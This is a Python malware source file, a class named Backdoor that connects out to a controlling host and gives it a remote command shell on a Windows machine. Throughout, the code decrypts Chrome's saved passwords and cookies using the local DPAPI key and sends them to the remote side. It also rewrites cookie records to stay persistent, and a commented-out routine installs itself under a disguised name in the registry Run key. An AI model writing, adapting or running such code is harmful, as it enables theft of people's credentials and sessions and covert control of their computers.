import json
import socket
import subprocess
import os
import sys
import shutil
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta
import traceback

class Backdoor:
    def __init__(self, ip, port):
        # self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def get_chrome_datetime(self, chromedate):
            """Return a `datetime.datetime` object from a chrome format datetime
            Since `chromedate` is formatted as the number of microseconds since January, 1601"""
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_encryption_key(self):
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Local", "Google", "Chrome",
                                            "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        # decode the encryption key from Base64
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # remove DPAPI str
        key = key[5:]
        # return decrypted key that was originally encrypted
        # using a session key derived from current user's logon credentials
        # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(self, password, key):
        try:
            # get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return ""
    def decrypt_data(self, data, key):
        try:
            # get the initialization vector
            iv = data[3:15]
            data = data[15:]
            # generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # decrypt password
            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:
                # not supported
                return ""
    def steal_cookie(self):
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
        filename = "Cookies.db"
        if not os.path.isfile(filename):
            shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()
        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
        FROM cookies""")
        key = self.get_encryption_key()
        host = []
        url = []
        data = []
        cookie = []
        # for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        #     if not value:
        #         decrypted_value = self.decrypt_data(encrypted_value, key)
        #     else:
        #         decrypted_value = value
        #     print(f"""
        #     Host: {host_key}
        #     Cookie name: {name}
        #     Cookie value (decrypted): {decrypted_value}
        #     Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
        #     Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
        #     Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
        #     ===============================================================
        #     """)
        for row in cursor.fetchall():
            if not row[2]:
                # host.append(host_key)
                # url.append(name)
                # data.append(value)
                # decrypted_value = self.decrypt_data(encrypted_value, key)
                # cookie.append(decrypted_value)

                host.append(row[0])
                url.append(row[1])
                data.append(row[2])
                decrypted_value = self.decrypt_data(row[6], key)
                cookie.append(decrypted_value)
            else:
                decrypted_value = row[2]
                data.append(row[2])
            cursor.execute("""
            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
            WHERE host_key = ?
            AND name = ?""", (decrypted_value, row[0], row[2]))
        # self.print_result(cookie)
        return host, url, data, cookie
        db.commit()
        db.close()

    # def print_result(self, array):
    #     # cookie = array[0]
    #     data = array[0]
    #     for i in range(0, len(array)):
    #         # print("Cookie: ", cookie[i])
    #         print("Data: ", data[i])

    def steal_password(self):
        # get the AES key
        key = self.get_encryption_key()
        # local sqlite Chrome database path
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "default", "Login Data")
        # copy the file to another location
        # as the database will be locked if chrome is currently running
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        # connect to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        # `logins` table has the data we need
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        # iterate over all rows
        host = []
        username = []
        password = []
        for row in cursor.fetchall():
            # origin_url = row[0]
            # action_url = row[1]
            # username = row[2]
            # password = self.decrypt_password(row[3], key)
            # date_created = row[4]
            # date_last_used = row[5]        
            host.append(row[0])
            username.append(row[2])
            password.append(self.decrypt_password(row[3], key))
            # if username or password:
                # print(f"Origin URL: {origin_url}")
                # print(f"Action URL: {action_url}")
                # print(f"Username: {username}")
                # print(f"Password: {password}")
                # return origin_url, action_url, username, password
        return host, username, password
            # else:
            #     continue
            #     return ""
            # if date_created != 86400000000 and date_created:
            #     print(f"Creation date: {str(self.get_chrome_datetime(date_created))}")
            #     return ""
            # if date_last_used != 86400000000 and date_last_used:
            #     print(f"Last Used: {str(self.get_chrome_datetime(date_last_used))}")
            #     return ""
        # print("="*50)
        cursor.close()
        db.close()
        try:
            # try to remove the copied db file
            os.remove(filename)
        except:
            pass

    # def become_persistent(self):
    #     evil_file_location = os.environ["appdata"] + "\\Window Explorer.exe"
    #     if not os.path.exits(evil_file_location):
    #         shutil.copyfile(sys.executable, evil_file_location)
    #         subprocess('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def exeSystem(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
        
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def change_directory(self, path):
        os.chdir(path)
        return "[+] Changing directory to " + path

    # def read_file(self, path):
    #     with open(path, "rb" ) as file:
    #         return file.read()

    def run(self):
        isTrue = True
        print("Connected")
        while isTrue == True:
            try:
                command = self.reliable_receive()
                if command[0] == "exit" or command[0] == "quit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    try:
                        command_result = self.change_directory(command[1])
                        recvData = self.reliable_send(command_result)
                    except Exception as e:
                        print("Exception: ", e)
                elif command[0] == "D:":
                    command_result = self.change_directory(command[0])
                    recvData = self.reliable_send(command_result)
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                    recvData = self.reliable_send(command_result.decode('utf-8', errors='ignore'))
                elif command[0] == "exploit" or command[0] == "1":
                    command_result = self.steal_password()
                    recvData = self.reliable_send(command_result)
                elif command[0] == "2" or command[0] == "run":
                    command_result = self.steal_cookie()
                    recvData = self.reliable_send(command_result)
                else:
                    command_result = self.exeSystem(command)
                    recvData = self.reliable_send(command_result.decode('cp1258', errors='ignore'))
            except Exception as e:
                print("Exception: ", e, "\n")
                traceback.print_exc()
                print("Comman error execution. Please try again")
                command_result = "[-] Command error execution. Please try another way."
                self.reliable_send(command_result)
try:    
    test = Backdoor("0.0.0.0", 9999)
    test.run()
except Exception:
    sys.exit()